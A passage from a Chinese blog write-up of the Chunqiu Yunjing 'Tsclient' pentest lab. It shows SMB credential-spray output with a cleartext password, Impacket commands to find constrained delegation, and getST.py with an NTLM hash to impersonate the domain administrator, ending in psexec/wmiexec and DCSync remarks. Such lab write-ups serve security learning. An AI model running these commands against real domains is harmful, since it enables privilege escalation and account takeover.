+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">SMB</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">         172.22.8.15</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">     445</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">    DC01</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">             [*] Windows 10.0 Build 20348 x64 (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">name:DC01</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">) (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">domain:xiaorang.lab</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">) (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">signing:True</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">) (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">SMBv1:False</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">SMB</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">         172.22.8.31</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">     445</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">    WIN19-CLIENT</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">     [*] Windows 10.0 Build 17763 x64 (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">name:WIN19-CLIENT</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">) (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">domain:xiaorang.lab</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">) (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">signing:False</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">) (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">SMBv1:False</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">SMB</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">         172.22.8.46</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">     445</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">    WIN2016</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">          [+] xiaorang.lab</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\A</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">ldrich:P@ssw0rd</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">SMB</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">         172.22.8.18</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">     445</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">    WIN-WEB</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">          [-] xiaorang.lab</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\A</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">ldrich:P@ssw0rd STATUS_LOGON_FAILURE</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">SMB</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">         172.22.8.15</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">     445</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">    DC01</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">             [+] xiaorang.lab</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\A</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">ldrich:P@ssw0rd</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">SMB</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">         172.22.8.31</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">     445</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">    WIN19-CLIENT</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">     [+] xiaorang.lab</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\A</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">ldrich:P@ssw0rd</span></span></code></pre>
+<p>查询域委派关系</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> proxychains</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> findDelegation.py</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> xiaorang.lab/Aldrich:</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">P@ssw0rd</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -dc-ip</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 172.22.8.15</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -target-domain</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> xiaorang.lab</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">Impacket</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> v0.10.1.dev1+20230718.100545.fdbd2568</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> -</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Copyright</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 2022</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Fortra</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">AccountName</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">    AccountType</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  DelegationType</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">                      DelegationRightsTo</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">-------------</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF">  -----------</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF">  ----------------------------------</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF">  --------------------------------------------------</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">WIN2016$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">       Computer</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">     Constrained</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> w/</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Protocol</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Transition</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  ldap/DC01.xiaorang.lab/xiaorang.lab</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">WIN2016$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">       Computer</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">     Constrained</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> w/</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Protocol</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Transition</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  ldap/DC01.xiaorang.lab</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">WIN2016$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">       Computer</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">     Constrained</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> w/</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Protocol</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Transition</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  ldap/DC01</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">WIN2016$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">       Computer</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">     Constrained</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> w/</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Protocol</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Transition</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  ldap/DC01.xiaorang.lab/XIAORANG</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">WIN2016$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">       Computer</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">     Constrained</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> w/</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Protocol</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Transition</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  ldap/DC01/XIAORANG</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">WIN2016$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">       Computer</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">     Constrained</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> w/</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Protocol</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Transition</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  ldap/DC01.xiaorang.lab/DomainDnsZones.xiaorang.lab</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">WIN2016$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">       Computer</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">     Constrained</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> w/</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Protocol</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Transition</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  ldap/DC01.xiaorang.lab/ForestDnsZones.xiaorang.lab</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">WIN19-CLIENT$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  Computer</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">     Constrained</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> w/</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Protocol</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Transition</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  cifs/WIN2016.xiaorang.lab</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">WIN19-CLIENT$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  Computer</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">     Constrained</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> w/</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Protocol</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Transition</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  cifs/WIN2016</span></span></code></pre>
+<p>存在从 <code>WIN2016$</code> 到 <code>DC01</code> 的约束委派, 并且委派的是 LDAP 服务</p>
+<p>利用 S4U 协议请求 ST 伪造 Administrator 用户</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">proxychains</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> getST.py</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> xiaorang.lab/WIN2016</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\$</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -hashes</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> :02b2a436556a3dd5d6638ad03f87c43e</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -dc-ip</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 172.22.8.15</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -spn</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> ldap/DC01.xiaorang.lab</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -impersonate</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> administrator</span></span></code></pre>
+<p><em>本来的思路是想利用票据进行 DCSync 导出域管 Hash 之后再去 psexec 的 (因为委派的是 LDAP 服务), 不过写 Writeup 的时候发现直接 psexec 或者 wmiexec 过去好像也行…</em></p>
+<p><img src="https://img.exp10it.io/img/202307301756896.png" alt="image-20230730175613824"></p>
+<p>flag03 在 Administrator 家目录下</p>
+<p><img src="https://img.exp10it.io/img/202307301759378.png" alt="image-20230730175952312"></p>
+<h2 id="后记">后记</h2>
+<p>中间重置了好几次靶机 (</p>
+<p>打完后才发现 <code>WIN2016$</code> 在 <code>Domain Admins</code> 组内, 所以直接 DCSync 也行</p>
+<p>查看域委派关系可以发现存在从 <code>WIN19-CLIENT</code> 到 <code>WIN2016</code> 的约束委派, 猜测或许也能通过 RDP 反打或者其它方式拿到 <code>WIN19-CLIENT</code> 的权限, 然后再通过委派拿到 <code>WIN2016</code> 的权限?</p> </article> <hr class="my-8 border-dashed"> <a href="https://github.com/X1r0z/exp10it.io/edit/master/src/data/pentest/chunqiuyunjing-tsclient-writeup.md" target="_blank" rel="noopener noreferrer" class="flex justify-baseline gap-1.5 opacity-80 hover:text-accent sm:hidden"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M7 7h-1a2 2 0 0 0 -2 2v9a2 2 0 0 0 2 2h9a2 2 0 0 0 2 -2v-1" /><path d="M20.385 6.585a2.1 2.1 0 0 0 -2.97 -2.97l-8.415 8.385v3h3l8.385 -8.415z" /><path d="M16 5l3 3" /></svg><span>Edit page</span></a> <ul class="mt-4 mb-8 sm:my-8"> <li class="group inline-block group-hover:cursor-pointer my-1 underline-offset-4"> <a href="/tags/windows/" class="relative pe-2 text-lg underline decoration-dashed group-hover:-top-0.5 group-hover:text-accent focus-visible:p-1 focus-visible:no-underline text-sm" data-astro-transition-scope="astro-36ssibgs-2"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block opacity-80 -me-3.5 size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M5 9l14 0" /><path d="M5 15l14 0" /><path d="M11 4l-4 16" /><path d="M17 4l-4 16" /></svg>
+&nbsp;<span>Windows</span> </a> </li><li class="group inline-block group-hover:cursor-pointer my-1 underline-offset-4"> <a href="/tags/mssql/" class="relative pe-2 text-lg underline decoration-dashed group-hover:-top-0.5 group-hover:text-accent focus-visible:p-1 focus-visible:no-underline text-sm" data-astro-transition-scope="astro-36ssibgs-3"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block opacity-80 -me-3.5 size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M5 9l14 0" /><path d="M5 15l14 0" /><path d="M11 4l-4 16" /><path d="M17 4l-4 16" /></svg>
+&nbsp;<span>MSSQL</span> </a> </li><li class="group inline-block group-hover:cursor-pointer my-1 underline-offset-4"> <a href="/tags/active-directory/" class="relative pe-2 text-lg underline decoration-dashed group-hover:-top-0.5 group-hover:text-accent focus-visible:p-1 focus-visible:no-underline text-sm" data-astro-transition-scope="astro-36ssibgs-4"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block opacity-80 -me-3.5 size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M5 9l14 0" /><path d="M5 15l14 0" /><path d="M11 4l-4 16" /><path d="M17 4l-4 16" /></svg>
+&nbsp;<span>Active Directory</span> </a> </li><li class="group inline-block group-hover:cursor-pointer my-1 underline-offset-4"> <a href="/tags/rdp/" class="relative pe-2 text-lg underline decoration-dashed group-hover:-top-0.5 group-hover:text-accent focus-visible:p-1 focus-visible:no-underline text-sm" data-astro-transition-scope="astro-36ssibgs-5"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block opacity-80 -me-3.5 size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M5 9l14 0" /><path d="M5 15l14 0" /><path d="M11 4l-4 16" /><path d="M17 4l-4 16" /></svg>
+&nbsp;<span>RDP</span> </a> </li> </ul> <div id="btt-btn-container" class="fixed end-4 bottom-8 z-50 md:sticky md:end-auto md:float-end md:me-1 translate-y-14 opacity-0 transition duration-500"> <button data-button="back-to-top" class="group relative bg-background px-2 py-1 size-14 rounded-full shadow-xl md:h-8 md:w-fit md:rounded-md md:shadow-none md:focus-visible:rounded-none md:bg-background/35 md:bg-clip-padding md:backdrop-blur-lg"> <span id="progress-indicator" class="absolute inset-0 -z-10 block size-14 scale-110 rounded-full bg-transparent md:hidden md:h-8 md:rounded-md"></span> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block rotate-90 md:hidden"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 6l-6 6l6 6" /></svg> <span class="sr-only text-sm group-hover:text-accent md:not-sr-only"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M12 5l0 14" /><path d="M16 9l-4 -4" /><path d="M8 9l4 -4" /></svg>
+Back To Top
+</span> </button> </div> <script data-astro-rerun>
+  /** Scrolls the document to the top when
+   * the "Back to Top" button is clicked. */
+  function backToTop() {
+    const rootElement = document.documentElement;
+    const btnContainer = document.querySelector("#btt-btn-container");
+    const backToTopBtn = document.querySelector("[data-button='back-to-top']");
+    const progressIndicator = document.querySelector("#progress-indicator");
+
+    if (!rootElement || !btnContainer || !backToTopBtn || !progressIndicator)
+      return;
+
+    // Attach click event handler for back-to-top button
+    backToTopBtn.addEventListener("click", () => {
+      document.body.scrollTop = 0; // For Safari
+      document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera
+    });
+
+    // Handle button visibility according to scroll position
+    let lastVisible = null;
+    function handleScroll() {
+      const scrollTotal = rootElement.scrollHeight - rootElement.clientHeight;
+      const scrollTop = rootElement.scrollTop;
+      const scrollPercent = Math.floor((scrollTop / scrollTotal) * 100);
+
+      progressIndicator.style.setProperty(
+        "background-image",
+        `conic-gradient(var(--accent), var(--accent) ${scrollPercent}%, transparent ${scrollPercent}%)`
+      );
+
+      const isVisible = scrollTop / scrollTotal > 0.3;
+
+      if (isVisible !== lastVisible) {
+        btnContainer.classList.toggle("opacity-100", isVisible);
+        btnContainer.classList.toggle("translate-y-0", isVisible);
+        btnContainer.classList.toggle("opacity-0", !isVisible);
+        btnContainer.classList.toggle("translate-y-14", !isVisible);
+        lastVisible = isVisible;
+      }
+    }
+
+    let ticking = false;
+    document.addEventListener("scroll", () => {
+      if (!ticking) {
+        window.requestAnimationFrame(() => {
+          handleScroll();
+          ticking = false;
+        });
+        ticking = true;
+      }
+    });
+  }
+  backToTop();
+</script> <div class="flex flex-none flex-col items-center justify-center gap-1 md:items-start"><span class="italic">Share this post on:</span><div class="text-center"><a href="https://wa.me/?text=https://exp10it.io/posts/chunqiuyunjing-tsclient-writeup/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post via WhatsApp"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 21l1.65 -3.8a9 9 0 1 1 3.4 2.9l-5.05 .9" /><path d="M9 10a.5 .5 0 0 0 1 0v-1a.5 .5 0 0 0 -1 0v1a5 5 0 0 0 5 5h1a.5 .5 0 0 0 0 -1h-1a.5 .5 0 0 0 0 1" /></svg><span class="sr-only">Share this post via WhatsApp</span></a><a href="https://www.facebook.com/sharer.php?u=https://exp10it.io/posts/chunqiuyunjing-tsclient-writeup/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post on Facebook"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M7 10v4h3v7h4v-7h3l1 -4h-4v-2a1 1 0 0 1 1 -1h3v-4h-3a5 5 0 0 0 -5 5v2h-3" /></svg><span class="sr-only">Share this post on Facebook</span></a><a href="https://x.com/intent/post?url=https://exp10it.io/posts/chunqiuyunjing-tsclient-writeup/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post on X"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 4l11.733 16h4.267l-11.733 -16z" /><path d="M4 20l6.768 -6.768m2.46 -2.46l6.772 -6.772" /></svg><span class="sr-only">Share this post on X</span></a><a href="https://t.me/share/url?url=https://exp10it.io/posts/chunqiuyunjing-tsclient-writeup/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post via Telegram"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 10l-4 4l6 6l4 -16l-18 7l4 2l2 6l3 -4" /></svg><span class="sr-only">Share this post via Telegram</span></a><a href="https://pinterest.com/pin/create/button/?url=https://exp10it.io/posts/chunqiuyunjing-tsclient-writeup/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post on Pinterest"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M8 20l4 -9" /><path d="M10.7 14c.437 1.263 1.43 2 2.55 2c2.071 0 3.75 -1.554 3.75 -4a5 5 0 1 0 -9.7 1.7" /><path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0" /></svg><span class="sr-only">Share this post on Pinterest</span></a><a href="mailto:?subject=See%20this%20post&#38;body=https://exp10it.io/posts/chunqiuyunjing-tsclient-writeup/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post via email"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z" /><path d="M3 7l9 6l9 -6" /></svg><span class="sr-only">Share this post via email</span></a></div></div> <hr class="my-6 border-dashed"> <!-- Previous/Next Post Buttons --> <div data-pagefind-ignore class="grid grid-cols-1 gap-6 sm:grid-cols-2"> <a href="/posts/resource-based-constrained-delegation-attack-summary" class="flex w-full gap-1 hover:opacity-75"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block flex-none rtl:rotate-180"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 6l-6 6l6 6" /></svg> <div> <span>Previous Post</span> <div class="text-sm text-accent/85">基于资源的约束委派 (RBCD) 利用总结</div> </div> </a> <a href="/posts/chunqiuyunjing-initial-writeup" class="flex w-full justify-end gap-1 text-end hover:opacity-75 sm:col-start-2"> <div> <span>Next Post</span> <div class="text-sm text-accent/85">春秋云镜 Initial Writeup</div> </div> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block flex-none rtl:rotate-180"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M9 6l6 6l-6 6" /></svg> </a> </div> </main> <footer class="w-full mt-auto"> <div class="mx-auto max-w-app px-0"> <hr class="border-border" aria-hidden="true"> </div> <div class="flex flex-col items-center justify-between py-6 sm:flex-row-reverse sm:py-4"> <div class="flex-wrap justify-center gap-1 flex"> <a href="https://github.com/X1r0z" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="X1r0z Blog on GitHub"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" /></svg> <span class="sr-only">X1r0z Blog on 